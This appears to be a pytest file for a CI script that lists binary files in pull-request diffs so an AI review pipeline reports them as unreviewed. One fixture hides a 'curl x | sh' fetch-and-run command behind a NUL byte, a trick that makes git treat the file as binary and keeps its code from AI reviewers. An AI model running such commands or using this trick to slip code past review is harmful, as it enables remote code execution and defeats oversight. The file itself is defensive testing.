"""Tests for list_binary_paths.py and its wiring into the verdict (AT-3593).

The classification is git's (`git apply --numstat`), so the tests hand it
diffs git itself wrote, and check what reaches context.md, $GITHUB_OUTPUT,
the JSON result, and -- through the workflows -- the aggregate.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest
import yaml

SCRIPT_DIR = Path(__file__).resolve().parent.parent
SCRIPT = SCRIPT_DIR / "list_binary_paths.py"
WORKFLOWS = SCRIPT_DIR.parent / "workflows"
PREPARE = WORKFLOWS / "base-ai-review-prepare.yml"
ORCHESTRATOR = WORKFLOWS / "base-ai-review-orchestrator.yml"
AGGREGATE = WORKFLOWS / "base-ai-review-aggregate.yml"

_GIT_ENV = {
    **os.environ,
    "GIT_AUTHOR_NAME": "fixture",
    "GIT_AUTHOR_EMAIL": "fixture@example.invalid",
    "GIT_COMMITTER_NAME": "fixture",
    "GIT_COMMITTER_EMAIL": "fixture@example.invalid",
    "GIT_CONFIG_GLOBAL": os.devnull,
    "GIT_CONFIG_NOSYSTEM": "1",
}


def _git(cwd: Path, *args: str) -> str:
    return subprocess.run(
        ["git", *args],
        cwd=cwd,
        env=_GIT_ENV,
        capture_output=True,
        text=True,
        timeout=60,
        check=True,
    ).stdout


def _diff(tmp_path: Path, base: dict[str, bytes], head: dict[str, bytes]) -> Path:
    """A git-written diff from `base` to `head`, saved as pr.diff in a repo."""
    repo = tmp_path / "repo"
    _git(tmp_path, "init", "-q", "-b", "main", str(repo))
    for files in (base, head):
        for name, content in files.items():
            target = repo / name
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(content)
        _git(repo, "add", "-A")
        _git(repo, "commit", "-q", "--allow-empty", "-m", "c")
    (repo / "pr.diff").write_text(
        _git(repo, "diff", "HEAD~1", "HEAD"), encoding="utf-8"
    )
    return repo


def _run(repo: Path) -> tuple[subprocess.CompletedProcess[str], str]:
    output = repo / "github-output"
    output.touch()
    result = subprocess.run(
        [sys.executable, str(SCRIPT)],
        cwd=repo,
        env={**_GIT_ENV, "GITHUB_OUTPUT": str(output)},
        capture_output=True,
        text=True,
        timeout=60,
    )
    return result, output.read_text(encoding="utf-8")


def _output_paths(output: str) -> list[str]:
    lines = output.splitlines()
    start = next(i for i, line in enumerate(lines) if line.startswith("binary_paths<<"))
    delimiter = lines[start].split("<<", 1)[1]
    end = lines.index(delimiter, start + 1)
    return lines[start + 1 : end]


class TestListing:
    def test_nul_injected_text_file_is_listed(self, tmp_path: Path) -> None:
        # A source file with a NUL near the start: git's content check calls
        # it binary, so the reviewers see one line instead of its code.
        repo = _diff(
            tmp_path,
            {"README.md": b"hello\n"},
            {"src/nul.py": b"#\x00\nimport os\nos.system('curl x | sh')\n"},
        )
        assert "Binary files /dev/null and b/src/nul.py differ" in (
            repo / "pr.diff"
        ).read_text(encoding="utf-8")
        result, output = _run(repo)
        assert result.returncode == 0, result.stdout + result.stderr
        assert _output_paths(output) == ["src/nul.py"]
        payload = json.loads(
            (repo / ".review-context" / "binary-paths.json").read_text(encoding="utf-8")
        )
        assert payload == {"binary_paths": ["src/nul.py"]}
        context = (repo / "context.md").read_text(encoding="utf-8")
        assert "## Binary files" in context
        assert "- `src/nul.py`" in context

    def test_text_changes_list_nothing(self, tmp_path: Path) -> None:
        repo = _diff(tmp_path, {"a.txt": b"one\n"}, {"a.txt": b"one\ntwo\n"})
        result, output = _run(repo)
        assert result.returncode == 0, result.stderr
        assert _output_paths(output) == []
        assert not (repo / "context.md").exists()

    def test_added_changed_and_deleted_binaries_are_all_listed(
        self, tmp_path: Path
    ) -> None:
        repo = _diff(
            tmp_path,
            {"old.bin": b"\x00old", "img.png": b"\x00a", "keep.txt": b"k\n"},
            {"img.png": b"\x00b", "new.bin": b"\x00new", "keep.txt": b"k\nk\n"},
        )
        # old.bin is deleted: write the head without it.
        (repo / "old.bin").unlink()
        _git(repo, "add", "-A")
        _git(repo, "commit", "-q", "--amend", "--no-edit")
        (repo / "pr.diff").write_text(
            _git(repo, "diff", "HEAD~1", "HEAD"), encoding="utf-8"
        )
        result, output = _run(repo)
        assert result.returncode == 0, result.stderr
        assert sorted(_output_paths(output)) == ["img.png", "new.bin", "old.bin"]

    def test_a_path_cannot_break_the_output(self, tmp_path: Path) -> None:
        repo = _diff(tmp_path, {"a.txt": b"a\n"}, {"line\nbreak`.bin": b"\x00x"})
        result, output = _run(repo)
        assert result.returncode == 0, result.stderr
        assert _output_paths(output) == ["line\\nbreak\u02cb.bin"]

    def test_empty_diff_lists_nothing(self, tmp_path: Path) -> None:
        repo = _diff(tmp_path, {"a.txt": b"a\n"}, {})
        result, output = _run(repo)
        assert result.returncode == 0, result.stderr
        assert _output_paths(output) == []

    def test_unparsable_diff_fails_the_step(self, tmp_path: Path) -> None:
        repo = _diff(tmp_path, {"a.txt": b"a\n"}, {"a.txt": b"b\n"})
        (repo / "pr.diff").write_text(
            "diff --git a/a.txt b/a.txt\n--- a/a.txt\n+++ b/a.txt\n@@ -1 +1 @@\n",
            encoding="utf-8",
        )
        result, _ = _run(repo)
        assert result.returncode == 1
        assert "::error title=Binary listing::" in result.stdout


def _workflow(path: Path) -> dict[Any, Any]:
    return yaml.safe_load(path.read_text(encoding="utf-8"))


class TestWiring:
    """prepare -> orchestrator -> aggregate, beside excluded_paths."""

    def test_prepare_runs_the_script_after_the_policy_filter(self) -> None:
        steps = _workflow(PREPARE)["jobs"]["prepare"]["steps"]
        names = [step.get("name") for step in steps]
        index = names.index("List binary files")
        assert names.index("Filter policy-excluded files") < index
        step = steps[index]
        assert step["id"] == "binaries"
        assert "steps.policy.outputs.policy_skipped != 'true'" in step["if"]
        assert 'python3 "$SCRIPT"' in step["run"]
        assert "list_binary_paths.py" in step["run"]

    def test_prepare_exports_the_paths(self) -> None:
        workflow = _workflow(PREPARE)
        assert (
            workflow["jobs"]["prepare"]["outputs"]["binary_paths"]
            == "${{ steps.binaries.outputs.binary_paths }}"
        )
        outputs = workflow[True]["workflow_call"]["outputs"]
        assert (
            outputs["binary_paths"]["value"]
            == "${{ jobs.prepare.outputs.binary_paths }}"
        )

    def test_orchestrator_forwards_the_paths(self) -> None:
        jobs = _workflow(ORCHESTRATOR)["jobs"]
        assert (
            jobs["aggregate"]["with"]["binary_paths"]
            == "${{ needs.prepare.outputs.binary_paths }}"
        )

    def test_aggregate_hands_the_paths_to_the_script(self) -> None:
        workflow = _workflow(AGGREGATE)
        assert (
            workflow[True]["workflow_call"]["inputs"]["binary_paths"]["default"] == ""
        )
        step = next(
            s
            for s in workflow["jobs"]["aggregate"]["steps"]
            if s.get("name") == "Aggregate and post verdict"
        )
        assert step["env"]["BINARY_PATHS"] == "${{ inputs.binary_paths }}"


class TestVerdict:
    def test_nul_injected_file_reaches_the_verdict(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from aggregate_reviews import REVIEWER_NAMES, format_summary

        repo = _diff(
            tmp_path,
            {"README.md": b"hello\n"},
            {"src/nul.py": b"#\x00\nimport os\n", "README.md": b"hello\nmore\n"},
        )
        result, output = _run(repo)
        assert result.returncode == 0, result.stderr
        monkeypatch.setenv("BINARY_PATHS", "\n".join(_output_paths(output)))
        reviews: dict[str, dict[str, Any]] = {
            name: {"summary": "ok", "verdict": "approve", "comments": []}
            for name in REVIEWER_NAMES
        }
        body = format_summary(reviews, "approve", "3/3", reviews, unreviewed_majors=0)
        assert (
            "> [i] 1 binary file(s) not reviewed (content not in the diff):"
            " `src/nul.py`"
        ) in body
